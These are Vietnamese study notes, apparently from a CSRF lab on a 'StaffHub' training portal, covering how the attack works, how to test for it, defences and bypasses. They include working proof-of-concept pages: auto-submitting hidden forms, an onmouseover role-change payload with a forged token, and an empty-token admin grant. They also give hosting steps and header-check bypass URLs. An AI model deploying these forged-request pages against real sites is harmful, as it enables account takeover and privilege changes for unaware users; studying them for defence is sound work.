# Introduction
- **CSRF (Cross-Site Request Forgery)** là tấn công lợi dụng việc browser tự động gửi cookies kèm theo mọi request đến website. 
- Thay vì đánh cắp credentials, CSRF **trick browser của victim** thực hiện các hành động trên website mà victim đang đăng nhập — mà victim không hề hay biết. 
- Web application nhận request đó và xử lý như thể đây là hành động hợp lệ của user.
## 🔐 Cơ Chế Authenticated Sessions

```
Flow đăng nhập bình thường:

1. User đăng nhập → Server tạo session
2. Server gửi: Set-Cookie: session=abc123
3. Browser LƯU cookie này
4. Mọi request sau → Browser TỰ ĐỘNG
   gửi kèm cookie

GET /profile HTTP/1.1
Host: bank.com
Cookie: session=abc123  ← Tự động thêm vào!

→ Server nhận ra user → Xử lý request
```

---

## ⚔️ CSRF Lợi Dụng Cơ Chế Này

```
Vấn đề:
Browser gửi cookie TỰ ĐỘNG
cho MỌI request đến domain đó
Dù request xuất phát từ ĐÂU!

CSRF exploit:
1. Victim đang đăng nhập bank.com
   (Có session cookie trong browser)

2. Victim vô tình vào attacker.com
   (Click link trong email, forum...)

3. attacker.com có hidden request:
   POST /transfer HTTP/1.1
   Host: bank.com
   Cookie: session=abc123 ← Browser tự thêm!
   
   amount=1000&to=attacker_account

4. bank.com nhận request
   → Thấy cookie hợp lệ
   → "Đây là user thật" ← KHÔNG phân biệt được!
   → Thực hiện transfer! 💸
```

---

## 🎭 CSRF vs Credential Theft

```
Credential Theft:              CSRF:
├── Đánh cắp username/pass     ├── KHÔNG cần credentials
├── Attacker tự đăng nhập      ├── Dùng session đang có của victim
└── Cần credentials thật       └── Trick browser thực hiện hành động

CSRF nguy hiểm hơn ở chỗ:
└── Victim đã authenticate rồi
    → Attacker "mượn" quyền đó
    → Không cần biết password
```

---

## 🌐 Tại Sao Browser Tự Động Gửi Cookies?

```
Đây là BEHAVIOR CỐ Ý của browser:
└── Convenience cho user
    → Không cần đăng nhập lại mỗi request

Nhưng tạo ra security risk:
└── Browser không phân biệt được:
    ├── Request do USER khởi tạo ✅
    └── Request do MALICIOUS SITE khởi tạo ❌
    → Cả hai đều được gửi kèm cookie!
```

---

## 💥 Ví Dụ Impact Thực Tế

```
Các hành động CSRF có thể thực hiện:
├── Chuyển tiền ngân hàng
├── Đổi email/password của account
├── Mua hàng online
├── Xóa dữ liệu quan trọng
├── Thêm attacker làm admin
└── Bất kỳ action nào victim có quyền làm
```
# What is CSRF
- Phần này đi sâu hơn vào **cơ chế hoạt động của CSRF** — một tấn công lợi dụng trust relationship giữa browser và web application. 
- Qua 3 bước đơn giản, attacker có thể khiến browser của victim thực hiện các hành động nhạy cảm mà không cần biết credentials. 
- Web application xử lý request như bình thường vì session cookie hợp lệ vẫn được gửi kèm.
## 🔄 3 Bước Của CSRF Attack
![](../Assets/Pasted%20image%2020260625151232.png)
```
BƯỚC 1: VICTIM ĐĂNG NHẬP
─────────────────────────
Victim → bank.com/login
         (nhập username/password)
              ↓
         Server tạo session
              ↓
         Set-Cookie: session=abc123
              ↓
         Browser LƯU cookie này

BƯỚC 2: ATTACKER DỤ VICTIM VÀO TRANG ĐỘC HẠI
──────────────────────────────────────────────
Email lừa đảo / Link trên forum / Quảng cáo...
         ↓
Victim click → Vào attacker.com
         ↓
Trang chứa HIDDEN REQUEST:
<img src="https://bank.com/transfer?to=attacker&amount=1000">
hoặc
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>

BƯỚC 3: BROWSER TỰ ĐỘNG GỬI REQUEST
─────────────────────────────────────
POST /transfer HTTP/1.1
Host: bank.com
Cookie: session=abc123  ← Tự động gửi kèm!
to=attacker_account&amount=1000
         ↓
Server thấy session hợp lệ
         ↓
"Đây là user thật → Thực hiện!" 💸
```

---

## 🎯 Trust Relationship Bị Lợi Dụng

```
Web app TIN TƯỞNG:
"Nếu request có session cookie hợp lệ
 → Request này do USER tạo ra"

Thực tế:
└── Session cookie hợp lệ ✅
    NHƯNG request do ATTACKER tạo ra ❌

Web app KHÔNG CÓ CÁCH phân biệt:
├── Request từ: bank.com (legitimate) ✅
└── Request từ: attacker.com (malicious) ❌
    → Cả hai đều có cookie hợp lệ!
```

---

## 💥 Actions CSRF Có Thể Thực Hiện

|Action|Impact|
|---|---|
|**Đổi email address**|Attacker chiếm account (reset password về email mới)|
|**Update account settings**|Thay đổi security preferences|
|**Financial transactions**|Chuyển tiền, mua hàng|
|**Modify security preferences**|Tắt 2FA, thay đổi security questions|
|**Admin actions** (nếu victim là admin)|Full system compromise|

---

## 🌐 Ví Dụ Thực Tế — Internal Portal

```
Scenario:
Employee đang:
├── Đăng nhập vào internal HR portal
└── Đồng thời browse internet (lunch break)

Attacker gửi email với link:
"Check out this funny cat video!"

Employee click → Vào malicious page
Page chứa hidden request:
POST https://hr-portal.company.com/update-email
Cookie: session=xyz789  ← Tự động!
new_email=attacker@evil.com

HR portal xử lý → Email bị đổi!
→ Attacker reset password → Chiếm account!
```

---

## 🔑 Root Cause

```
Browser behavior:
"Gửi cookies cho domain X với MỌI request đến X
 dù request xuất phát từ đâu"

Web app assumption:
"Request đến từ tôi + có session hợp lệ
 = User chủ động thực hiện"

→ Hai điều này kết hợp = CSRF vulnerability
```
# Why CSRF works
- Phần này giải thích **root cause thực sự của CSRF** — không phải browser bị lỗi mà là web application **tin tưởng request quá mức**. 
- Browser hoạt động đúng như thiết kế (tự động gửi cookies), nhưng web app không verify origin của request. Ba điều kiện cụ thể phải tồn tại đồng thời để CSRF attack thành công.
## 🔍 Browser Không Bị Lỗi — Web App Mới Là Vấn Đề

```
Browser behavior (ĐÚNG theo thiết kế):
└── Tự động gửi cookies với MỌI request
    đến cùng domain
    → Không quan tâm request xuất phát từ đâu

Web app assumption (SAI):
└── "Request có cookie hợp lệ
     = User chủ động thực hiện"

Vấn đề:
└── Browser KHÔNG phân biệt:
    ├── Request từ staffhub.thm/settings ✅
    └── Request từ evil.com → staffhub.thm ❌
    → Cả hai đều kèm session cookie!
```

---

## 🍪 Session Cookie — Cơ Chế Cốt Lõi

```
Flow:
User login → Server tạo session
          → Set-Cookie: session=abc123
          → Browser lưu cookie

Mọi request sau đến staffhub.thm:
GET /profile HTTP/1.1
Host: staffhub.thm
Cookie: session=abc123  ← LUÔN được gửi kèm

Server nhận:
"Cookie hợp lệ → Đây là authenticated user"
→ KHÔNG hỏi: "Request này xuất phát từ đâu?"
```

---

## ⚠️ 3 Điều Kiện BẮT BUỘC Cho CSRF

```
Cả 3 phải tồn tại ĐỒNG THỜI:

ĐIỀU KIỆN 1: VICTIM ĐÃ AUTHENTICATE
─────────────────────────────────────
Victim phải đang đăng nhập vào target app
→ Có session cookie hợp lệ trong browser
→ Nếu không login → Không có cookie → CSRF thất bại

ĐIỀU KIỆN 2: ACTION CÓ THAY ĐỔI STATE
────────────────────────────────────────
Application phải thực hiện:
├── Update settings
├── Modify account data
├── Perform transactions
└── Bất kỳ action nào thay đổi dữ liệu

→ Read-only actions (GET /profile) ít nguy hiểm
→ State-changing actions mới là target

ĐIỀU KIỆN 3: KHÔNG VERIFY ORIGIN
──────────────────────────────────
Application KHÔNG kiểm tra:
"Request này có đến từ trusted source không?"

→ Nếu có verify (CSRF token, Origin header...)
  → Attack thất bại
→ Nếu KHÔNG verify
  → Attack thành công!
```

---

## 📊 Khi Nào CSRF THÀNH CÔNG vs THẤT BẠI

```
Scenario A: THÀNH CÔNG ✅
├── Victim đang logged in ✅
├── Action: POST /update-email ✅ (state-change)
└── Không có CSRF protection ✅
→ Attack works!

Scenario B: THẤT BẠI ❌
├── Victim đang logged in ✅
├── Action: POST /update-email ✅
└── Có CSRF token validation ❌
→ Server reject → Attack fails!

Scenario C: THẤT BẠI ❌
├── Victim KHÔNG logged in ❌
├── (cookie không tồn tại)
→ Request không có session → Rejected!

Scenario D: THẤT BẠI ❌
├── Victim logged in ✅
├── Action: GET /view-profile ❌ (read-only)
└── Không có protection ✅
→ Không có impact dù attack "works"
```

---

## 🌐 Ví Dụ Staffhub.thm

```
Employee đang logged in → staffhub.thm
(Browser có session cookie)

Employee vào website khác → evil.com
evil.com trigger hidden request:
POST https://staffhub.thm/update-settings
Cookie: session=abc123 ← Tự động!

staffhub.thm nhận request:
├── Có session cookie? ✅
├── Session hợp lệ? ✅
└── Verify origin? ❌ (Không có)
→ Xử lý như legitimate request!
```
# Finding  CSRF Vulnerabilities
- Trước khi exploit CSRF, pentester cần **identify đúng target** — không phải mọi feature đều vulnerable. 
- CSRF tập trung vào **state-changing actions** (thay đổi dữ liệu) thay vì read-only actions. 
- Phần này cũng phá vỡ misconception phổ biến: **POST method KHÔNG tự động bảo vệ khỏi CSRF** — cả GET lẫn POST đều có thể bị exploit.
## 🎯 Câu Hỏi Cốt Lõi Khi Testing

```
Với MỖI feature trong app, hỏi:

"Action này có thể được trigger
 mà KHÔNG verify request thực sự
 đến từ user không?"

├── YES → Potential CSRF vulnerability!
└── NO  → Likely protected
```

---

## 🔍 Phân Biệt Request Types

```
READ-ONLY (Ít nguy hiểm):
└── Chỉ lấy thông tin
    GET /view-profile
    GET /account-balance
    → Không thay đổi gì → Ít là CSRF target

STATE-CHANGING (CSRF Target):
└── Thay đổi dữ liệu/settings
    POST /update-email
    POST /change-password
    POST /transfer-funds
    → ĐÂY là primary CSRF targets!
```

---

## ⚠️ Common Features Vulnerable To CSRF

```
Các features thường bị CSRF:

ACCOUNT SETTINGS:
├── Đổi email address
├── Đổi password
├── Update profile information
└── Thay đổi security settings

FINANCIAL:
├── Transfer funds
├── Purchase items
└── Update payment methods

ADMIN ACTIONS:
├── Add/remove users
├── Change permissions
└── Modify system settings

SECURITY PREFERENCES:
├── Disable/enable 2FA
├── Change recovery email
└── Update security questions
```

---

## 🚫 Phá Vỡ Misconception: POST Không Đủ

```
Developer nghĩ:
"Dùng POST method → An toàn khỏi CSRF"

Thực tế:
❌ SAI HOÀN TOÀN!

GET Request CSRF:
<img src="https://bank.com/transfer?to=attacker&amount=1000">
→ Browser load image → GET request gửi đi!
→ Cookie tự động kèm theo!
→ Action thực hiện!

POST Request CSRF:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
→ Form tự submit → POST request gửi đi!
→ Cookie tự động kèm theo!
→ Action thực hiện!

→ CẢ HAI đều exploitable nếu không có CSRF protection!
```

---

## 📋 Cách Trigger CSRF Theo Method

|Method|Cách Trigger|Ví Dụ|
|---|---|---|
|**GET**|`<img src="">`, `<a href="">`, link|`<img src="bank.com/delete?id=5">`|
|**POST**|Hidden form + auto-submit script|`<form>...<script>submit()</script>`|
|**Both**|Fetch API, XMLHttpRequest|JavaScript request|

---

## 🔎 Methodology Khi Testing CSRF

```
BƯỚC 1: MAP toàn bộ application features
└── List tất cả actions user có thể làm

BƯỚC 2: PHÂN LOẠI
├── Read-only → Deprioritize
└── State-changing → Focus vào đây

BƯỚC 3: INSPECT requests
└── Có CSRF token không?
    Có Origin/Referer check không?
    Có custom header requirement không?

BƯỚC 4: TEST
└── Remove protection mechanism
    → App vẫn process? → Vulnerable!
    → App reject? → Protected

BƯỚC 5: CRAFT exploit
└── Tạo malicious page
    trigger action mà không cần user biết
```
# Exploitation using HTML Form
- Phần này trình bày **CSRF exploitation thực tế** trên StaffHub portal — một ứng dụng cho phép user update email nhưng **không có CSRF protection**. 
- Attacker tạo một hidden HTML form tự động submit khi victim mở trang, gửi forged request kèm session cookie của victim đến server. 
- Server xử lý bình thường vì không verify origin của request.
## 🔍 Phân Tích Vulnerable Form
![](../Assets/Pasted%20image%2020260625161546.png)
```html
<!-- Form gốc của StaffHub (KHÔNG có protection) -->
<form action="update_email.php" method="POST">
    <input type="email" name="email" required>
    <button type="submit">Update Email</button>
</form>
```

**Điểm yếu:**

```
Request chỉ chứa:
└── email parameter

Không có:
├── ❌ CSRF token
├── ❌ Origin verification
├── ❌ Custom header requirement
└── ❌ Bất kỳ verification mechanism nào

→ Ai biết structure này đều có thể reproduce!
```

---

## ⚔️ Crafting Malicious Page

html

```html
<!-- settings.html — Trang độc của attacker -->
<html>
<body>

<!-- Hidden form — Victim không thấy -->
<form action="http://staffhub.thm:8080/update_email.php"
      method="POST"
      id="attack">
    <input type="hidden"
           name="email"
           value="attacker@evilmail.thm">
    <!--    ↑ Giá trị attacker muốn set -->
</form>

<script>
    // Tự động submit khi page load
    document.getElementById("attack").submit();

    // Redirect victim sau 1 giây
    // (Trông như trang bình thường)
    setTimeout(function() {
        window.location.href =
            "http://staffhub.thm:8080/settings.php";
    }, 1000);
</script>

</body>
</html>
```

**Phân tích từng phần:**

```
<input type="hidden">
└── Victim KHÔNG thấy form
    Nhưng browser vẫn submit

document.getElementById("attack").submit()
└── Tự động submit NGAY KHI page load
    Không cần victim click gì!

setTimeout redirect
└── Sau 1 giây redirect về StaffHub
    → Victim không nghi ngờ gì
```

---

## 🔄 Attack Flow Hoàn Chỉnh

```
BƯỚC 1: Setup
Attacker đặt settings.html tại:
http://CONNECTION_IP:81/settings.html

BƯỚC 2: Social Engineering
Attacker gửi link cho victim:
"Click vào đây để xem thông báo quan trọng"
→ http://ATTACKER_MACHINE:81/settings.html

BƯỚC 3: Victim Click
Browser mở settings.html
          ↓
JavaScript tự động submit form
          ↓
POST /update_email.php HTTP/1.1
Host: staffhub.thm:8080
Cookie: session=abc123  ← Tự động kèm!
email=attacker@evilmail.thm

BƯỚC 4: Server Xử Lý
StaffHub nhận request:
├── Session cookie hợp lệ? ✅
├── Email parameter valid? ✅
└── Verify origin? ❌ (Không có)
→ UPDATE email → attacker@evilmail.thm ✅

BƯỚC 5: Redirect
1 giây sau → Redirect về settings.php
Victim thấy trang settings bình thường
→ KHÔNG biết email đã bị đổi!
```

---

## 💥 Impact

```
Sau attack thành công:
└── victim@staffhub.thm
    →  attacker@evilmail.thm

Hệ quả:
├── Attacker click "Forgot Password"
├── Reset link gửi về attacker@evilmail.thm
├── Attacker reset password
└── FULL ACCOUNT TAKEOVER! 🔓
```

---

## 📁 Setup Attacker Server

```bash
# Đặt file vào web server của Attack Server
cd /var/www/html
nano settings.html
# Paste malicious HTML code

# File accessible tại:
http://CONNECTION_IP:81/settings.html
```
- Cách này giúp thiết lập 1 server apache trên attacker machine để nạn nhân truy cập vào link html
- Các cách khác: [Hosting Malicious HTML - Python & Apache.md](../Tool%20Cheesheet/03_Web_App/Payload%20Hosting/Hosting%20Malicious%20HTML%20-%20Python%20&%20Apache.md.md)
# Exploitation over weak token
- Phần này giải thích cách **bypass CSRF protection yếu** khi token được tạo ra từ dữ liệu có thể đoán được. 
- Dù developer đã thêm CSRF token vào request, nếu token được generate theo cách **predictable và reversible** (như Base64 encode role của user), attacker vẫn có thể tái tạo token và thực hiện tấn công. 
- Kỹ thuật được dùng là **image-based CSRF attack** với `onmouseover` event.
## **1. Vấn Đề Với CSRF Token Yếu**

```
CSRF token TỐT phải có:
✅ Unique — khác nhau mỗi request
✅ Unpredictable — không thể đoán được
✅ Tied to session — gắn với session của user

CSRF token YẾU trong bài này:
❌ Base64 encode của user's role
❌ Predictable — biết role là biết token
❌ Reversible — dễ dàng decode
```

## **2. Phân Tích Token**

![](../Assets/Pasted%20image%2020260625164133.png)

```html
<input type="hidden" name="csrf_token" value="YWRtaW4=">
```

```
YWRtaW4= → Base64 Decode → "admin"

Logic của app:
user.role = "admin"
csrf_token = base64_encode("admin") = "YWRtaW4="

→ Attacker biết role → Tái tạo token ngay lập tức!
```

## **3. Tại Sao Đây Là Vấn Đề Nghiêm Trọng?**

```
Attacker không cần:
❌ Steal token từ victim's browser
❌ Intercept traffic
❌ Có session của victim

Attacker chỉ cần:
✅ Biết role của target user ("admin" hay "staff")
✅ Base64 encode role đó
✅ Tạo request với token tự tính được
```

## **4. Chuẩn Bị Payload — Image-based CSRF**

html

```html
<html>
<body>
  <h2>StaffHub Internal Notice</h2>
  <p>Move your mouse over the banner below to load the latest role updates.</p>

  <img src="http://staffhub.thm:8080/one.png"
       onmouseover="window.location='http://staffhub.thm:8080/update_role.php
                    ?role=staff
                    &csrf_token=YWRtaW4='"
       width="400">
</body>
</html>
```

**Giải thích từng phần:**

|Phần|Mô tả|
|---|---|
|`<img src="...">`|Hiển thị ảnh bình thường — trông vô hại|
|`onmouseover="..."`|Trigger khi victim di chuột qua ảnh|
|`window.location='...'`|Redirect browser đến URL tấn công|
|`?role=staff`|Thay đổi role của victim thành "staff"|
|`&csrf_token=YWRtaW4=`|Token hợp lệ — attacker tự tính được|

## **5. Tại Sao Attack Thành Công?**

```
Victim đã login vào StaffHub
        ↓
Victim visit trang độc hại của attacker
        ↓
Victim di chuột qua ảnh → onmouseover trigger
        ↓
Browser redirect đến:
http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4=
        ↓
Browser TỰ ĐỘNG gửi kèm:
→ Session cookie của victim (đã authenticated)
→ CSRF token hợp lệ (attacker đã tính trước)
        ↓
Server thấy:
✅ Session cookie hợp lệ → User đã login
✅ CSRF token đúng → Request "hợp lệ"
        ↓
Role của victim bị đổi từ admin → staff ❌
```

## **6. Social Engineering Vector**

```
Attacker gửi link qua:
- Email
- Chat message
- Tin nhắn nội bộ

Nội dung trông hợp lệ:
"StaffHub Internal Notice — xem cập nhật mới"
        ↓
Victim click link, visit trang
        ↓
Di chuột qua banner → Tấn công xảy ra ngầm
```

## **7. Setup Trang Tấn Công**

bash

```bash
# Trên AttackBox:
cd /var/www/html
nano role.html
# → Paste payload HTML vào

# Victim truy cập qua:
http://10.49.83.104:81/role.html
```
- Các cách setup khác: [Hosting Malicious HTML - Python & Apache.md](../Tool%20Cheesheet/03_Web_App/Payload%20Hosting/Hosting%20Malicious%20HTML%20-%20Python%20&%20Apache.md.md)
# Best Practice
- Phần này hướng dẫn **5 practices quan trọng** giúp pentester nhanh chóng phát hiện CSRF vulnerabilities trong web applications. 
- Mục tiêu là xác định các endpoints có thể bị tấn công CSRF trước khi tiến hành exploit thực tế.
## **1. Focus on State-Changing Requests**

```
CSRF nguy hiểm nhất khi tấn công các request THAY ĐỔI dữ liệu:

HIGH PRIORITY targets:
├── Password changes
├── Email updates
├── Account settings
├── Financial transactions
├── Role/permission changes
└── Profile updates

LOW PRIORITY (ít nguy hiểm hơn):
└── Read-only requests (GET data, view profile)
```

> Lý do: Read-only requests không gây hại dù bị CSRF, còn state-changing requests có thể dẫn đến account takeover, data loss, hoặc unauthorized actions.

## **2. Inspect Requests for CSRF Tokens**

```
Checklist khi kiểm tra CSRF token:

❓ Có token không?
   → Không có token → Có thể vulnerable ngay

❓ Token có static không?
   → Cùng token cho mọi request → Vulnerable

❓ Token có predictable không?
   → Base64 encoded data → Reversible → Vulnerable
   → Sequential numbers → Guessable → Vulnerable

❓ Token có được validate đúng không?
   → Gửi request không có token → Vẫn thành công? → Vulnerable
   → Gửi token sai → Vẫn thành công? → Vulnerable
```

## **3. Analyse HTTP Methods**

```
ĐÚNG — State-changing dùng POST:
POST /update_email
Body: email=new@example.com&csrf_token=xxxxx
→ Khó exploit hơn (cần form hoặc AJAX)

SAI — State-changing dùng GET:
GET /update_email?email=new@example.com
→ Dễ exploit bằng:
   <img src="http://target.com/update_email?email=hack@evil.com">
   hoặc đơn giản là 1 link
```

**Tại sao GET dễ exploit hơn?**

```
GET request = có thể trigger bằng:
- <img src="...">         ← Tự động load khi page render
- <a href="...">          ← User click link
- window.location='...'   ← JavaScript redirect
- CSS background-image    ← Load ngầm

POST request cần:
- HTML form với method="POST"
- JavaScript fetch/AJAX
→ Phức tạp hơn nhưng vẫn possible
```

## **4. Test Requests Outside The Application**

```
Quy trình test:

Bước 1: Intercept request bằng Burp Suite
         POST /change_password
         Cookie: session=abc123
         csrf_token=xyz789

Bước 2: Tạo HTML page bên ngoài app
         <form action="http://target.com/change_password" method="POST">
           <input name="password" value="hacked">
           <input name="csrf_token" value="xyz789">
         </form>

Bước 3: Submit từ external page
         → Thành công? → CSRF vulnerability confirmed ❌
         → Thất bại?  → Protection đang hoạt động ✅

Bước 4: Test thêm — Remove/modify token
         → Xóa csrf_token → Vẫn thành công? → Vulnerable
         → Sai token → Vẫn thành công? → Vulnerable
```

## **5. Observe Cookie Behaviour**

```
CSRF có thể xảy ra khi:
Browser tự động gửi session cookie với mọi request
        ↓
App chỉ check: "Cookie hợp lệ không?"
Không check: "Request đến từ đâu?"
        ↓
= CSRF vulnerable

Dấu hiệu cần kiểm tra:

✅ App có check Origin/Referer header không?
   → Không check → Vulnerable

✅ App có dùng SameSite cookie attribute không?
   → Không có SameSite=Strict/Lax → Vulnerable

✅ App có require custom header không?
   → Không → Vulnerable (custom headers không tự động gửi cross-origin)
```

---

### Workflow Tổng Hợp Khi Test CSRF

```
Tìm state-changing endpoints
        ↓
Kiểm tra có CSRF token không?
        ├── Không có → Test exploit ngay
        └── Có token → Phân tích token:
                ├── Static/predictable? → Bypass và exploit
                └── Random? → Test validation:
                        ├── Xóa token → Vẫn work? → Vulnerable
                        └── Sai token → Vẫn work? → Vulnerable
        ↓
Kiểm tra HTTP method
        └── Dùng GET? → Dễ exploit hơn
        ↓
Reproduce từ external page
        └── Thành công? → CSRF confirmed
        ↓
Kiểm tra cookie SameSite attribute
        └── Không có Strict/Lax? → Dễ bị exploit hơn
```
# Defending Against CSRF
- Phần này trình bày **các biện pháp bảo vệ chống CSRF** và **những điểm yếu phổ biến** trong cách triển khai các biện pháp đó. 
- Hiểu cả hai phía — defense và bypass — giúp developer implement đúng và pentester biết cách test hiệu quả.
## Các Biện Pháp Bảo Vệ
### **1. SameSite Cookies**

```
Cookie attribute ngăn browser gửi cookie theo cross-site requests

Các mức độ:
SameSite=Strict → Không gửi cookie khi cross-site (bảo vệ tốt nhất)
SameSite=Lax    → Cho phép top-level navigation (GET từ links)
SameSite=None   → Gửi cookie mọi lúc (không bảo vệ)

Ví dụ set cookie:
Set-Cookie: session=abc123; SameSite=Strict; Secure
```
#### Giải thích Cho phép top-level navigation (GET từ links)
```
Top-level navigation = Khi TOÀN BỘ browser tab/window
                       chuyển đến một URL mới

Ví dụ đơn giản:
- Bạn click 1 link → Cả trang chuyển sang trang mới
- Đó là top-level navigation
```

---

##### So Sánh Top-level vs Non-top-level

```
TOP-LEVEL NAVIGATION (SameSite=Lax CHO PHÉP):
┌─────────────────────────────┐
│  Tab hiện tại               │
│  evil.com                   │
│                             │
│  [Click link này]           │──→ Toàn bộ tab chuyển sang
└─────────────────────────────┘     bank.com/transfer?amount=1000
                                    Cookie gửi kèm ✅ (Lax cho phép)

NON-TOP-LEVEL (SameSite=Lax CHẶN):
┌─────────────────────────────┐
│  Tab hiện tại               │
│  evil.com                   │
│                             │
│  <img src="bank.com/...">   │──→ Request ngầm trong nền
│  <iframe src="bank.com/...">│    Cookie KHÔNG gửi ❌ (Lax chặn)
└─────────────────────────────┘
```

---

##### Ví Dụ Cụ Thể

**Trường hợp 1 — Lax CHO PHÉP (top-level):**

html

```html
<!-- Trên trang evil.com -->

<!-- User click link → Toàn bộ tab chuyển đến bank.com -->
<a href="http://bank.com/transfer?to=attacker&amount=1000">
    Click để nhận quà!
</a>
→ Browser chuyển trang → Cookie bank.com gửi kèm
→ Transfer thực hiện → CSRF thành công ❌
```

**Trường hợp 2 — Lax CHẶN (non-top-level):**

html

```html
<!-- Trên trang evil.com -->

<!-- Request ngầm → Không chuyển trang -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">
<iframe src="http://bank.com/transfer?to=attacker&amount=1000">

→ Request nền → Cookie KHÔNG gửi
→ Transfer không thực hiện → CSRF thất bại ✅
```

---

##### Hình Dung Thực Tế

```
Giống như quy tắc vào tòa nhà:

SameSite=Strict:
"Chỉ nhân viên đi từ BÊN TRONG tòa nhà mới được vào"
→ Không ai từ ngoài vào được

SameSite=Lax:
"Nhân viên đi qua cổng chính (top-level) thì được vào"
"Nhưng không ai được chui qua cửa sổ (ngầm) vào"
→ Kẻ xấu dẫn nhân viên đi qua cổng chính vẫn được!

SameSite=None:
"Ai cũng vào được, dù cổng chính hay cửa sổ"
```

---

##### Tại Sao Lax Vẫn Có Lỗ Hổng?

```
Lax chỉ chặn request NGẦM trong nền:
❌ <img src="...">
❌ <iframe src="...">
❌ fetch() / AJAX
❌ <script src="...">

Nhưng KHÔNG chặn khi user "đi qua cổng chính":
✅ <a href="..."> user click
✅ Form GET submit
✅ window.location = "..."
✅ <meta http-equiv="refresh">

→ GET-based CSRF vẫn work với Lax!
```

---

##### Tóm Lại

|Loại Request|SameSite=Strict|SameSite=Lax|SameSite=None|
|---|---|---|---|
|Link click (GET)|❌ Chặn|✅ Cho phép|✅ Cho phép|
|Form GET submit|❌ Chặn|✅ Cho phép|✅ Cho phép|
|Form POST submit|❌ Chặn|❌ Chặn|✅ Cho phép|
|`<img>` / `<iframe>`|❌ Chặn|❌ Chặn|✅ Cho phép|
|AJAX / fetch|❌ Chặn|❌ Chặn|✅ Cho phép|
## **2. CORS (Cross-Origin Resource Sharing)**

```
CORS policy của victim site ảnh hưởng đến feasibility của attack:

Nếu attack cần ĐỌC response:
→ CORS policy nghiêm ngặt → Attacker không đọc được → Khó attack hơn

Nếu attack chỉ cần GỬI request (không cần đọc response):
→ CORS không đủ bảo vệ → Vẫn cần CSRF token
```

## **3. User Verification**

```
Yêu cầu xác nhận thêm trước khi thực hiện sensitive action:

├── Re-enter password
│   "Nhập lại mật khẩu để xác nhận"
│
└── CAPTCHA
    "Giải CAPTCHA để tiếp tục"

→ Attacker không thể tự động hóa vì cần user input thực sự
→ Hiệu quả nhưng ảnh hưởng UX
```

## **4. Checking Referrer/Origin Headers**

```
Server validate request đến từ đâu:

Origin header:  "http://trusted.com"
Referer header: "http://trusted.com/settings"

→ Chỉ accept request từ trusted origins
```

**Nhưng dễ bị bypass nếu implement sai:**

```
Bypass 1 — URL ends with trusted domain:
http://mal.net?orig=http://example.com
→ Regex tìm "example.com" ở cuối → Match → BYPASS ❌

Bypass 2 — URL starts with trusted domain:
http://example.com.mal.net
→ Regex tìm "example.com" ở đầu → Match → BYPASS ❌
```

# **5. Modifying Parameter Names**

```
Đổi tên parameters thường xuyên:
/update?email=... → /update?e_mail_field_2024=...

→ Attacker không biết tên parameter đúng
→ Automation attacks khó hơn
→ Không phải biện pháp mạnh — chỉ là obscurity
```

## **6. CSRF Tokens (Quan Trọng Nhất)**

```
Token ĐÚNG phải có:
✅ Unique per session
✅ Cryptographically random
✅ Server-side validated
✅ Kết hợp với CORS enforcement

Flow đúng:
1. User request page → Server generate random token
2. Token lưu trong server session
3. Token embed vào form hidden field
4. User submit form → Token đi kèm
5. Server compare token trong request vs token trong session
6. Match → Accept | Không match → Reject
```
# Defences Bypass
- Phần này trình bày các kỹ thuật **bypass CSRF defences** ngay cả khi ứng dụng đã implement protection. 
- Mỗi kỹ thuật khai thác một điểm yếu cụ thể trong cách developer implement CSRF protection — từ logic lỗi, token không được validate đúng, đến các quirks của browser và framework.
## **1. POST → GET Method Switch**

```php
// Code lỗi phổ biến trong PHP:
if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true;
// → GET request KHÔNG check CSRF token!
```

**Exploit:**

```
Original (có token):
POST /action?module=Home
Body: __csrf_token=abc123&data=payload

Bypass (không cần token):
GET /action?module=Home&data=payload
→ Không có token → Server bỏ qua check → Thành công ❌
```

> Thường kết hợp với **reflected XSS** khi response sai Content-Type (`text/html` thay vì `application/json`).

---

## **2. Xóa Token Hoàn Toàn (Lack of Token)**

```
Lỗi 1: App chỉ validate token KHI token có mặt
→ Xóa token parameter → Không validate → Bypass

Lỗi 2: App chỉ check token TỒN TẠI, không check GIÁ TRỊ
→ Gửi token rỗng → Accepted

POST /admin/users/role
username=guest&role=admin&csrf=    ← Empty token → Works! ❌
```

**PoC tự động submit:**

html

```html
<html>
<body>
  <form action="https://example.com/admin/users/role" method="POST">
    <input type="hidden" name="username" value="guest" />
    <input type="hidden" name="role" value="admin" />
    <input type="hidden" name="csrf" value="" />
  </form>
  <script>
    history.pushState('', '', '/');  // Ẩn navigation
    document.forms[0].submit();      // Auto submit
  </script>
</body>
</html>
```

---

## **3. Token Không Gắn Với Session**

```
Lỗi: Token validate qua global pool, không gắn với session cụ thể

Exploit:
1. Attacker login vào account riêng
2. Lấy CSRF token hợp lệ từ global pool
3. Dùng token đó trong attack nhắm vào victim
→ Server thấy token hợp lệ → Accept → CSRF thành công ❌
```

---

## **4. Method Override Bypass**

```
Một số frameworks hỗ trợ override HTTP method:

POST /users/delete
Body: username=admin&_method=DELETE

→ Server xử lý như DELETE request
→ Nhưng CSRF check chỉ apply cho POST
→ DELETE handler không check CSRF → Bypass ❌
```

**Các headers override phổ biến:**

```
_method=DELETE          (query param hoặc body)
X-HTTP-Method: DELETE
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
```

**Frameworks bị ảnh hưởng:** Laravel, Symfony, Express, v.v.

---

## **5. Custom Header Token Bypass**

```
App dùng custom header làm CSRF protection:
X-CSRF-Token: abc123

Test:
1. Xóa header hoàn toàn → Vẫn work? → Vulnerable
2. Giữ header nhưng đổi giá trị cùng length → Vẫn work? → Vulnerable
```

---

## **6. Client-Side CSRF (CSPT2CSRF)**

```
Modern SPA apps build requests từ user-controlled inputs:
- URL parameters
- Path segments
- localStorage
- postMessage data
- Uploaded JSON/config files

Nếu attacker-controlled data → fetch()/XHR path sink:
→ Browser gửi same-origin request
→ SameSite cookies được gửi (same-site!)
→ CSRF headers tự động append
→ Origin/Referer checks pass (trusted frontend!)
```

**Upload gadget variant:**

json

```json
{"aaa":"WEBP","_id":"../../../../admin/users/promote"}
```

→ Frontend JSON.parse() file → Concatenate `_id` vào API path → CSRF!

---

